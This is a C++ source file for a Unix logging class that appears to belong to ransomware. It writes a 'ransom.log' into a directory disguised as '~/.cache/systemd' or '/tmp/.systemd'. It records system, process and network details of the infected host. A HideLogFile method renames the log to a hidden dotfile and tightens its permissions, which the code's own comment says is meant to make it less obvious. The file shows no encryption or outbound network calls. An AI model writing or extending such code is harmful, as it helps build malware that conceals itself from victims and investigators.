#include "utils/logger.h"
#include <fstream>
#include <iostream>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <sys/stat.h>
#include <unistd.h>
#include <pthread.h>

class UnixLogger : public Logger {
private:
    std::string logPath;
    std::ofstream logFile;
    pthread_mutex_t logMutex = PTHREAD_MUTEX_INITIALIZER;
    bool enabled = true;
    
public:
    UnixLogger() {
        // Set log path to user's hidden directory
        const char* home = getenv("HOME");
        if (home) {
            logPath = std::string(home) + "/.cache/systemd";
        } else {
            logPath = "/tmp/.systemd";
        }
        
        // Create directory if it doesn't exist
        struct stat st = {0};
        if (stat(logPath.c_str(), &st) == -1) {
            mkdir(logPath.c_str(), 0755);
        }
        
        logPath += "/ransom.log";
        
        // Initialize mutex
        pthread_mutex_init(&logMutex, nullptr);
    }
    
    ~UnixLogger() {
        if (logFile.is_open()) {
            logFile.close();
        }
        pthread_mutex_destroy(&logMutex);
    }
    
    void Log(const std::string& message) override {
        if (!enabled) return;
        
        pthread_mutex_lock(&logMutex);
        
        try {
            if (!logFile.is_open()) {
                logFile.open(logPath, std::ios::app);
            }
            
            if (logFile.is_open()) {
                auto now = std::chrono::system_clock::now();
                auto time_t = std::chrono::system_clock::to_time_t(now);
                auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
                    now.time_since_epoch()) % 1000;
                
                logFile << "[" << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
                logFile << "." << std::setfill('0') << std::setw(3) << ms.count() << "] ";
                logFile << message << std::endl;
                logFile.flush();
            }
        }
        catch (...) {
            // Ignore logging errors
        }
        
        pthread_mutex_unlock(&logMutex);
    }
    
    void LogError(const std::string& error) override {
        Log("[ERROR] " + error);
    }
    
    void LogInfo(const std::string& info) override {
        Log("[INFO] " + info);
    }
    
    void LogWarning(const std::string& warning) override {
        Log("[WARNING] " + warning);
    }
    
    void SetEnabled(bool enabled) override {
        this->enabled = enabled;
    }
    
    bool IsEnabled() override {
        return enabled;
    }
    
    void Clear() override {
        pthread_mutex_lock(&logMutex);
        
        if (logFile.is_open()) {
            logFile.close();
        }
        
        // Clear the log file
        std::ofstream clearFile(logPath, std::ios::trunc);
        clearFile.close();
        
        pthread_mutex_unlock(&logMutex);
    }
    
    std::vector<std::string> GetRecentLogs(int count) override {
        std::vector<std::string> logs;
        std::ifstream file(logPath);
        std::string line;
        
        // Read all lines first
        std::vector<std::string> allLines;
        while (std::getline(file, line)) {
            allLines.push_back(line);
        }
        
        // Get last 'count' lines
        int start = std::max(0, (int)allLines.size() - count);
        for (int i = start; i < allLines.size(); i++) {
            logs.push_back(allLines[i]);
        }
        
        return logs;
    }
    
    size_t GetLogSize() override {
        struct stat st;
        if (stat(logPath.c_str(), &st) == 0) {
            return st.st_size;
        }
        return 0;
    }
    
    void RotateLog() override {
        pthread_mutex_lock(&logMutex);
        
        if (logFile.is_open()) {
            logFile.close();
        }
        
        // Rotate logs
        std::string logPath1 = logPath + ".1";
        std::string logPath2 = logPath + ".2";
        
        // Remove oldest log
        unlink(logPath2.c_str());
        
        // Move existing logs
        rename(logPath1.c_str(), logPath2.c_str());
        rename(logPath.c_str(), logPath1.c_str());
        
        pthread_mutex_unlock(&logMutex);
    }
    
    // Unix-specific logging methods
    void LogSystemInfo() {
        Log("[SYSTEM] Collecting system information...");
        
        // Get system info
        struct utsname unameData;
        if (uname(&unameData) == 0) {
            Log("[SYSTEM] OS: " + std::string(unameData.sysname) + " " + std::string(unameData.release));
            Log("[SYSTEM] Hostname: " + std::string(unameData.nodename));
            Log("[SYSTEM] Architecture: " + std::string(unameData.machine));
        }
        
        // Get memory info
        std::ifstream meminfo("/proc/meminfo");
        std::string line;
        while (std::getline(meminfo, line)) {
            if (line.find("MemTotal:") == 0 || line.find("MemAvailable:") == 0) {
                Log("[SYSTEM] " + line);
            }
        }
        
        // Get CPU info
        std::ifstream cpuinfo("/proc/cpuinfo");
        int cpuCount = 0;
        while (std::getline(cpuinfo, line)) {
            if (line.find("processor") == 0) {
                cpuCount++;
            }
        }
        Log("[SYSTEM] CPU cores: " + std::to_string(cpuCount));
    }
    
    void LogProcessInfo() {
        Log("[PROCESS] Process information:");
        Log("[PROCESS] PID: " + std::to_string(getpid()));
        Log("[PROCESS] PPID: " + std::to_string(getppid()));
        Log("[PROCESS] UID: " + std::to_string(getuid()));
        Log("[PROCESS] GID: " + std::to_string(getgid()));
        
        // Get executable path
        char exePath[1024];
        ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
        if (len != -1) {
            exePath[len] = '\0';
            Log("[PROCESS] Executable: " + std::string(exePath));
        }
    }
    
    void LogNetworkInfo() {
        Log("[NETWORK] Network information:");
        
        // Get network interfaces
        std::ifstream routes("/proc/net/route");
        std::string line;
        while (std::getline(routes, line)) {
            if (line.find("00000000") != std::string::npos) {
                Log("[NETWORK] Default route: " + line);
            }
        }
        
        // Get network connections
        std::ifstream connections("/proc/net/tcp");
        int connCount = 0;
        while (std::getline(connections, line)) {
            connCount++;
        }
        Log("[NETWORK] TCP connections: " + std::to_string(connCount));
    }
    
    void HideLogFile() {
        // Make log file hidden and less obvious
        std::string hiddenPath = logPath;
        size_t lastSlash = hiddenPath.find_last_of('/');
        if (lastSlash != std::string::npos) {
            hiddenPath = hiddenPath.substr(0, lastSlash + 1) + "." + 
                        hiddenPath.substr(lastSlash + 1);
        }
        
        pthread_mutex_lock(&logMutex);
        
        if (logFile.is_open()) {
            logFile.close();
        }
        
        rename(logPath.c_str(), hiddenPath.c_str());
        logPath = hiddenPath;
        
        // Set file permissions to be less obvious
        chmod(logPath.c_str(), 0600);
        
        pthread_mutex_unlock(&logMutex);
    }
};
